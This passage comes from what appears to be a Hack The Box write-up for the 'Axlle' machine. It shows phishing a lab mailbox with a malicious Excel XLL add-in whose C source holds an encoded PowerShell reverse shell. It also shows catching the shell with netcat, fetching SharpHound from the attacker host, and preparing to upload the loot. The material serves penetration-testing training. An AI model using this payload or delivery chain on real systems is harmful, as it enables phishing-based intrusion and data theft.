+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$ sudo tcpdump -i tun0 icmp
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+</span></code></pre></div>
+<p>Finally we have to send the malicious XLL as an email attachment, as discussed above. We use <code>swaks</code> to send the email to the victim containing our malicious file.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$ swaks --from xpltive@axlle.htb --to accounts@axlle.htb --header &quot;Subject: Important notice&quot; --body &quot;Please refer to attachment&quot; --attach @ping.xll --server axlle.htb --port 25                                                                                                     
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>=== Trying axlle.htb:25...
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>=== Connected to axlle.htb.
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>&lt;-  220 MAINFRAME ESMTP
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a> -&gt; EHLO kali
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>&lt;-  250-MAINFRAME
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>&lt;-  250-SIZE 20480000
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>&lt;-  250-AUTH LOGIN
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>&lt;-  250 HELP
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a> -&gt; MAIL FROM:&lt;xpltive@axlle.htb&gt;
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>&lt;-  250 OK
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a> -&gt; RCPT TO:&lt;accounts@axlle.htb&gt;
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>&lt;-  250 OK
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a> -&gt; DATA
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>&lt;-  354 OK, send.
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a> -&gt; Date: Fri, 17 Jan 2025 16:11:21 +0100
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a> -&gt; To: accounts@axlle.htb
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a> -&gt; From: xpltive@axlle.htb
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a> -&gt; Subject: Important notice
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a> -&gt; Message-Id: &lt;20250117161121.278952@kali&gt;
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a> -&gt; X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a> -&gt; MIME-Version: 1.0
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a> -&gt; Content-Type: multipart/mixed; boundary=&quot;----=_MIME_BOUNDARY_000_278952&quot;
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a> -&gt; 
+</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a> -&gt; ------=_MIME_BOUNDARY_000_278952
+</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a> -&gt; Content-Type: text/plain
+</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a> -&gt; 
+</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a> -&gt; Please refer to attachment
+</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a> -&gt; ------=_MIME_BOUNDARY_000_278952
+</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a> -&gt; Content-Type: application/octet-stream; name=&quot;ping.xll&quot;
+</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a> -&gt; Content-Description: ping.xll
+</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a> -&gt; Content-Disposition: attachment; filename=&quot;ping.xll&quot;
+</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a> -&gt; Content-Transfer-Encoding: BASE64
+</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a> -&gt; 
+</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a> -&gt; TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a> &lt;--SNIP--&gt;
+</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a> -&gt; aW5nd19hcHBfdHlwZQA=
+</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a> -&gt; 
+</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a> -&gt; ------=_MIME_BOUNDARY_000_278952--
+</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a> -&gt; 
+</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a> -&gt; 
+</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a> -&gt; .
+</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a>&lt;-  250 Queued (9.864 seconds)
+</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a> -&gt; QUIT
+</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a>&lt;-  221 goodbye
+</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a>=== Connection closed with remote host.
+</span></code></pre></div>
+<p>Almost immediately after sending the email we get the pings from the victim to our host.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>$ sudo tcpdump -i tun0 icmp
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>16:05:46.839206 IP axlle.htb &gt; 10.10.16.33: ICMP echo request, id 1, seq 2, length 40
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>16:05:46.839235 IP 10.10.16.33 &gt; axlle.htb: ICMP echo reply, id 1, seq 2, length 40
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>16:05:47.849697 IP axlle.htb &gt; 10.10.16.33: ICMP echo request, id 1, seq 3, length 40
+</span></code></pre></div>
+<h4 id="reverse-shell-payload">Reverse Shell Payload<a class="headerlink" href="#reverse-shell-payload" title="Permanent link">&para;</a></h4>
+<p>Having confirmed the phishing attack as being successful, we will now move on to craft our reverse shell payload. For this we will use a simple <code>base64</code> encoded PowerShell command using <a href="https://www.revshells.com/">revshells</a>. In the <code>xlAutoOpen</code> function we simply replace the <code>ping</code> command.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>#include &lt;windows.h&gt;
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>#include &lt;stdlib.h&gt;
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>short __stdcall xlAutoOpen()
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>{
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>    system(&quot;cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAzACIALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot;);
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>    return 1;
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>}
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>BOOL APIENTRY DllMain( HMODULE hModule,
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>                    DWORD  ul_reason_for_call,
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>                    LPVOID lpReserved
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>                    )
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>{
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>    switch (ul_reason_for_call)
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>    {
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>    case DLL_PROCESS_ATTACH:
+</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>    case DLL_THREAD_ATTACH:
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>    case DLL_THREAD_DETACH:
+</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>    case DLL_PROCESS_DETACH:
+</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>        break;
+</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>    }
+</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>    return TRUE;
+</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>}
+</span></code></pre></div>
+<p>Once again we compile it using <code>MinGW</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>$ x86_64-w64-mingw32-gcc -shared shelly.c -o shelly.xll
+</span></code></pre></div>
+<p>And send it as an email attachment to the victim using <code>swaks</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>$ swaks --from xpltive@axlle.htb --to accounts@axlle.htb --header &quot;Subject: Important notice&quot; --body &quot;Please refer to attachment&quot; --attach @shelly.xll --server axlle.htb --port 25                                                                                                   
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>=== Trying axlle.htb:25...
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>=== Connected to axlle.htb.
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>&lt;-  220 MAINFRAME ESMTP
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a> -&gt; EHLO kali
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>&lt;-  250-MAINFRAME
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>&lt;-  250-SIZE 20480000
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>&lt;-  250-AUTH LOGIN
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>&lt;-  250 HELP
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a> -&gt; MAIL FROM:&lt;xpltive@axlle.htb&gt;
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>&lt;-  250 OK
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a> -&gt; RCPT TO:&lt;accounts@axlle.htb&gt;
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>&lt;-  250 OK
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a> -&gt; DATA
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>&lt;-  354 OK, send.
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a> -&gt; Date: Fri, 17 Jan 2025 16:05:31 +0100
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a> -&gt; To: accounts@axlle.htb
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a> -&gt; From: xpltive@axlle.htb
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a> -&gt; Subject: Important notice
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a> -&gt; Message-Id: &lt;20250117160531.272604@kali&gt;
+</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a> -&gt; X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a> -&gt; MIME-Version: 1.0
+</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a> -&gt; Content-Type: multipart/mixed; boundary=&quot;----=_MIME_BOUNDARY_000_272604&quot;
+</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a> -&gt; 
+</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a> -&gt; ------=_MIME_BOUNDARY_000_272604
+</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a> -&gt; Content-Type: text/plain
+</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a> -&gt; 
+</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a> -&gt; Please refer to attachment
+</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a> -&gt; ------=_MIME_BOUNDARY_000_272604
+</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a> -&gt; Content-Type: application/octet-stream; name=&quot;shelly.xll&quot;
+</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a> -&gt; Content-Description: shelly.xll
+</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a> -&gt; Content-Disposition: attachment; filename=&quot;shelly.xll&quot;
+</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a> -&gt; Content-Transfer-Encoding: BASE64
+</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a> -&gt; 
+</span><span id="__span-8-35"><a id="__codelineno-8-35" name="__codelineno-8-35" href="#__codelineno-8-35"></a> -&gt; TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span><span id="__span-8-36"><a id="__codelineno-8-36" name="__codelineno-8-36" href="#__codelineno-8-36"></a> &lt;--SNIP--&gt;
+</span><span id="__span-8-37"><a id="__codelineno-8-37" name="__codelineno-8-37" href="#__codelineno-8-37"></a> -&gt; aW5nd19hcHBfdHlwZQA=
+</span><span id="__span-8-38"><a id="__codelineno-8-38" name="__codelineno-8-38" href="#__codelineno-8-38"></a> -&gt; 
+</span><span id="__span-8-39"><a id="__codelineno-8-39" name="__codelineno-8-39" href="#__codelineno-8-39"></a> -&gt; ------=_MIME_BOUNDARY_000_278952--
+</span><span id="__span-8-40"><a id="__codelineno-8-40" name="__codelineno-8-40" href="#__codelineno-8-40"></a> -&gt; 
+</span><span id="__span-8-41"><a id="__codelineno-8-41" name="__codelineno-8-41" href="#__codelineno-8-41"></a> -&gt; 
+</span><span id="__span-8-42"><a id="__codelineno-8-42" name="__codelineno-8-42" href="#__codelineno-8-42"></a> -&gt; .
+</span><span id="__span-8-43"><a id="__codelineno-8-43" name="__codelineno-8-43" href="#__codelineno-8-43"></a>&lt;-  250 Queued (9.864 seconds)
+</span><span id="__span-8-44"><a id="__codelineno-8-44" name="__codelineno-8-44" href="#__codelineno-8-44"></a> -&gt; QUIT
+</span><span id="__span-8-45"><a id="__codelineno-8-45" name="__codelineno-8-45" href="#__codelineno-8-45"></a>&lt;-  221 goodbye
+</span><span id="__span-8-46"><a id="__codelineno-8-46" name="__codelineno-8-46" href="#__codelineno-8-46"></a>=== Connection closed with remote host.
+</span></code></pre></div>
+<p>Before issuing the above command and thus sending the email, we start our listener to catch the reverse shell connection being established by the victim. After sending the email we successfully catch the shell as domain user <code>gideon.hamill</code> on the <code>MAINFRAME</code> host.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>$ rlwrap -cAr nc -lvnp 6666
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>listening on [any] 6666 ...
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>connect to [10.10.16.33] from (UNKNOWN) [10.129.65.77] 49719
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>PS C:\&gt; whoami
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>axlle\gideon.hamill
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>PS C:\&gt; hostname
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>MAINFRAME
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>PS C:\&gt; 
+</span></code></pre></div>
+<h2 id="ad-enumeration">AD Enumeration<a class="headerlink" href="#ad-enumeration" title="Permanent link">&para;</a></h2>
+<p>Since we now have code execution as a domain user, we start by gathering information about the Active Directory domain <code>axlle.htb</code>.</p>
+<p>To do so we upload the <code>SharpHound</code> collector for <code>BloodHound</code> to the victim host and run it. We first start a download server on our attack host.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>$ python3 -m http.server 1080
+</span></code></pre></div>
+<p>Next we download the tool to the victim host using <code>curl</code> and subsequently run it to collect all domain information and save it to a <code>zip</code> file.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>PS C:\ProgramData\xpltive&gt; curl http://10.10.16.33:1080/SharpHound.exe -o hound.exe
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>PS C:\ProgramData\xpltive&gt; .\hound.exe -c All --zipfilename axlle
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>2025-01-17T07:29:17.8884358-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>2025-01-17T07:29:17.9040465-08:00|INFORMATION|Initializing SharpHound at 7:29 AM on 1/17/2025
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>2025-01-17T07:29:18.0759172-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for axlle.htb : MAINFRAME.axlle.htb
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>2025-01-17T07:29:18.1072200-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>2025-01-17T07:29:18.3259535-08:00|INFORMATION|Beginning LDAP search for axlle.htb
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>2025-01-17T07:29:18.3728350-08:00|INFORMATION|Producer has finished, closing LDAP channel
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>2025-01-17T07:29:18.3728350-08:00|INFORMATION|LDAP channel closed, waiting for consumers
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>2025-01-17T07:29:48.9822088-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>2025-01-17T07:30:07.2477771-08:00|INFORMATION|Consumers finished, closing output channel
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>2025-01-17T07:30:07.2790401-08:00|INFORMATION|Output channel closed, waiting for output task to complete
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>Closing writers
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>2025-01-17T07:30:07.4821674-08:00|INFORMATION|Status: 113 objects finished (+113 2.306123)/s -- Using 44 MB RAM
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>2025-01-17T07:30:07.4821674-08:00|INFORMATION|Enumeration finished in 00:00:49.1587646
+</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a>2025-01-17T07:30:07.5602917-08:00|INFORMATION|Saving cache with stats: 72 ID to type mappings.
+</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a> 72 name to SID mappings.
+</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a> 0 machine sid mappings.
+</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a> 2 sid to domain mappings.
+</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a> 0 global catalog mappings.
+</span><span id="__span-11-22"><a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a>2025-01-17T07:30:07.5602917-08:00|INFORMATION|SharpHound Enumeration Completed at 7:30 AM on 1/17/2025! Happy Graphing!
+</span></code></pre></div>
+<p>We transfer the ZIP archive over to our attack host, by first starting an upload server.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>$ python3 -m uploadserver 1080
+</span></code></pre></div>
+<p>And issue the file upload to this server using <code>curl.exe</code> on the victim host.</p>
